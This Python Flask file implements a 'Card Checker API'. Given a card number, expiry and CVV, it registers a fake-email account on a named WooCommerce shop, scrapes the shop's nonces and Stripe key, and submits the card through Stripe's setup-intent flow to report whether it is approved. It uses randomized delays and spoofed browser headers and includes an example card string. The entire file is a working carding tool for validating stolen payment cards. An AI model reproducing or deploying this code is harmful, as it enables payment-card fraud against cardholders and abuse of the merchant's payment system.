from flask import Flask, request, jsonify
import requests
import json
import re
import time
import random
import datetime
from typing import Dict, Any, Optional
from faker import Faker

app = Flask(__name__)
faker = Faker()

def auto_request(
    url: str,
    method: str = 'GET',
    headers: Optional[Dict[str, str]] = None,
    data: Optional[Dict[str, Any]] = None,
    params: Optional[Dict[str, Any]] = None,
    json_data: Optional[Dict[str, Any]] = None,
    dynamic_params: Optional[Dict[str, Any]] = None,
    session: Optional[requests.Session] = None
) -> requests.Response:
 
    clean_headers = {}
    if headers:
        for key, value in headers.items():
            if key.lower() != 'cookie':
                clean_headers[key] = value
    
    if data is None:
        data = {}
    if params is None:
        params = {}

    if dynamic_params:
        for key, value in dynamic_params.items():
            if 'ajax' in key.lower():
                params[key] = value
            else:
                data[key] = value

    req_session = session if session else requests.Session()

    request_kwargs = {
        'url': url,
        'headers': clean_headers,
        'data': data if data else None,
        'params': params if params else None,
        'json': json_data,
        'cookies': {} 
    }

    request_kwargs = {k: v for k, v in request_kwargs.items() if v is not None}

    response = req_session.request(method, **request_kwargs)
    response.raise_for_status()
    
    return response

def run_automated_process(card_num, card_cvv, card_yy, card_mm, user_ag, client_element, guid, muid, sid):
    session = requests.Session()
    base_url = 'https://dilaboards.com'
    
    print("Starting New Session")

    print("\n1. Performing initial GET request...")
    url_1 = f'{base_url}/en/moj-racun/add-payment-method/'
    headers_1 = {
        'User-Agent': user_ag,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Alt-Used': 'dilaboards.com',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Priority': 'u=0, i',
    }
    
    try:
        response_1 = auto_request(url_1, method='GET', headers=headers_1, session=session)
        
        regester_nouce = re.findall('name="woocommerce-register-nonce" value="(.*?)"', response_1.text)[0]
        pk = re.findall('"key":"(.*?)"', response_1.text)[0]
        print(f"   - Extracted regester_nouce: {regester_nouce}")
        print(f"   - Extracted pk: {pk}")
        time.sleep(random.uniform(1.0, 3.0))
    except Exception as e:
        print(f"   - Request 1 Failed: {e}")
        return {
            "success": False,
            "message": f"Failed to initialize: {str(e)}"
        }

    print("\n2. Performing POST request to register email...")
    url_2 = f'{base_url}/en/moj-racun/add-payment-method/'
    headers_2 = {
        'User-Agent': user_ag,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': base_url,
        'Alt-Used': 'dilaboards.com',
        'Connection': 'keep-alive',
        'Referer': url_1,
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Priority': 'u=0, i',
    }
    data_2 = {
        'email': faker.email(domain="gamil.com"),
        'wc_order_attribution_source_type': 'typein',
        'wc_order_attribution_referrer': '(none)',
        'wc_order_attribution_utm_campaign': '(none)',
        'wc_order_attribution_utm_source': '(direct)',
        'wc_order_attribution_utm_medium': '(none)',
        'wc_order_attribution_utm_content': '(none)',
        'wc_order_attribution_utm_id': '(none)',
        'wc_order_attribution_utm_term': '(none)',
        'wc_order_attribution_utm_source_platform': '(none)',
        'wc_order_attribution_utm_creative_format': '(none)',
        'wc_order_attribution_utm_marketing_tactic': '(none)',
        'wc_order_attribution_session_entry': url_1,
        'wc_order_attribution_session_start_time': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'wc_order_attribution_session_pages': '2',
        'wc_order_attribution_session_count': '1',
        'wc_order_attribution_user_agent': user_ag,
        'woocommerce-register-nonce': regester_nouce,
        '_wp_http_referer': '/en/moj-racun/add-payment-method/',
        'register': 'Register',
    }
    
    try:
        response_2 = auto_request(url_2, method='POST', headers=headers_2, data=data_2, session=session)
        
        ajax_nonce = re.findall('"createAndConfirmSetupIntentNonce":"(.*?)"', response_2.text)[0]
        print(f"   - Extracted ajax_nonce: {ajax_nonce}")
        time.sleep(random.uniform(1.0, 3.0))
    except Exception as e:
        print(f"   - Request 2 Failed: {e}")
        return {
            "success": False,
            "message": f"Failed to register email: {str(e)}"
        }

    print("\n3. Performing POST request to Stripe API...")
    url_3 = 'https://api.stripe.com/v1/payment_methods'
    headers_3 = {
        'User-Agent': user_ag,
        'Accept': 'application/json',
        'Accept-Language': 'en-US,en;q=0.5',
        'Referer': 'https://js.stripe.com/',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://js.stripe.com',
        'Connection': 'keep-alive',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'Priority': 'u=4',
    }
    
    data_3 = {
        'type': 'card',
        f'card[number]': card_num,
        f'card[cvc]': card_cvv,
        f'card[exp_year]': card_yy,
        f'card[exp_month]': card_mm,
        'allow_redisplay': 'unspecified',
        'billing_details[address][postal_code]': '11081',
        'billing_details[address][country]': 'US',
        'payment_user_agent': 'stripe.js/c1fbe29896; stripe-js-v3/c1fbe29896; payment-element; deferred-intent',
        'referrer': f'{base_url}',
        'time_on_page': str(random.randint(100000, 999999)),
        'client_attribution_metadata[client_session_id]': client_element,
        'client_attribution_metadata[merchant_integration_source]': 'elements',
        'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
        'client_attribution_metadata[merchant_integration_version]': '2021',
        'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
        'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
        'client_attribution_metadata[elements_session_config_id]': client_element,
        'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
        'guid': guid,
        'muid': muid,
        'sid': sid,
        'key': pk,
        '_stripe_version': '2024-06-20',
    }
    
    try:
        response_3 = auto_request(url_3, method='POST', headers=headers_3, data=data_3, session=session)
        
        response_data = response_3.json()
        if 'id' not in response_data:
            error_msg = response_data.get('error', {}).get('message', 'Failed to create payment method')
            return {
                "success": False,
                "message": f"Stripe payment method failed: {error_msg}"
            }
        
        pm = response_data['id']
        print(f"   - Extracted pm (payment method ID): {pm}")
        time.sleep(random.uniform(1.0, 3.0))
    except Exception as e:
        print(f"   - Request 3 Failed: {e}")
        return {
            "success": False,
            "message": f"Stripe API error: {str(e)}"
        }

    print("\n4. Performing final POST request with wc-ajax and pm...")
    url_4 = f'{base_url}/en/'
    headers_4 = {
        'User-Agent': user_ag,
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': base_url,
        'Alt-Used': 'dilaboards.com',
        'Connection': 'keep-alive',
        'Referer': url_1,
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
    }
    
    dynamic_params_4 = {
        'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
        'action': 'create_and_confirm_setup_intent',
        'wc-stripe-payment-method': pm,
        'wc-stripe-payment-type': 'card',
        '_ajax_nonce': ajax_nonce,
    }
    
    try:
        response_4 = auto_request(url_4, method='POST', headers=headers_4, dynamic_params=dynamic_params_4, session=session)
        
        print("\n--- Final Request Response (Raw Text) ---")
        print(response_4.text)
        
        # Parse the final response
        try:
            final_response = response_4.json()
            success = final_response.get('success', False)
            
            if success:
                return {
                    "success": True,
                    "message": "Card approved successfully"
                }
            else:
                # Extract error message from various possible locations
                error_message = "Card was declined"
                
                if 'data' in final_response and 'error' in final_response['data']:
                    error_message = final_response['data']['error'].get('message', error_message)
                elif 'message' in final_response:
                    error_message = final_response['message']
                elif 'error' in final_response and 'message' in final_response['error']:
                    error_message = final_response['error']['message']
                
                return {
                    "success": False,
                    "message": error_message
                }
                
        except json.JSONDecodeError:
            return {
                "success": False,
                "message": f"Invalid JSON response from server"
            }
            
    except Exception as e:
        print(f"   - Request 4 Failed: {e}")
        return {
            "success": False,
            "message": f"Final confirmation failed: {str(e)}"
        }

@app.route('/autost', methods=['GET'])
def autost():
    """
    API endpoint to check a credit card
    URL: /autost?card={full_card_number}
    
    The card number should include:
    - Card number
    - Expiry month (MM)
    - Expiry year (YY)
    - CVV
    
    Format: card_number|MM|YY|CVV
    Example: 4031488439059819|08|27|276
    """
    try:
        # Get the card parameter
        card_param = request.args.get('card')
        
        if not card_param:
            return jsonify({
                "success": False,
                "message": "Missing 'card' parameter. Format: /autost?card=number|MM|YY|CVV"
            }), 400
        
        # Parse the card data
        try:
            parts = card_param.split('|')
            if len(parts) != 4:
                return jsonify({
                    "success": False,
                    "message": "Invalid card format. Use: number|MM|YY|CVV"
                }), 400
            
            card_number = parts[0].strip()
            exp_month = parts[1].strip()
            exp_year = parts[2].strip()
            cvv = parts[3].strip()
            
            # Validate card number
            if not card_number.isdigit() or len(card_number) < 15 or len(card_number) > 16:
                return jsonify({
                    "success": False,
                    "message": "Invalid card number"
                }), 400
            
            # Validate expiry
            if not exp_month.isdigit() or not exp_year.isdigit():
                return jsonify({
                    "success": False,
                    "message": "Invalid expiry date format"
                }), 400
            
            # Validate CVV
            if not cvv.isdigit() or len(cvv) < 3 or len(cvv) > 4:
                return jsonify({
                    "success": False,
                    "message": "Invalid CVV"
                }), 400
                
        except Exception as e:
            return jsonify({
                "success": False,
                "message": f"Error parsing card data: {str(e)}"
            }), 400
        
        # Optional parameters with defaults
        user_agent = request.args.get('user_agent', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36')
        client_element = request.args.get('client_element', 'src_1234567890abcdef')
        guid = request.args.get('guid', 'guid_placeholder')
        muid = request.args.get('muid', 'muid_placeholder')
        sid = request.args.get('sid', 'sid_placeholder')
        
        # Run the process
        result = run_automated_process(
            card_num=card_number,
            card_cvv=cvv,
            card_yy=exp_year,
            card_mm=exp_month,
            user_ag=user_agent,
            client_element=client_element,
            guid=guid,
            muid=muid,
            sid=sid
        )
        
        return jsonify(result)
    
    except Exception as e:
        return jsonify({
            "success": False,
            "message": f"An error occurred: {str(e)}"
        }), 500

@app.route('/', methods=['GET'])
def index():
    return jsonify({
        "service": "Card Checker API",
        "version": "1.0",
        "endpoint": "/autost?card={card_number}|{MM}|{YY}|{CVV}",
        "example": "/autost?card=4031488439059819|08|27|276",
        "response_format": {
            "success": "boolean (true/false)",
            "message": "string (status message)"
        }
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
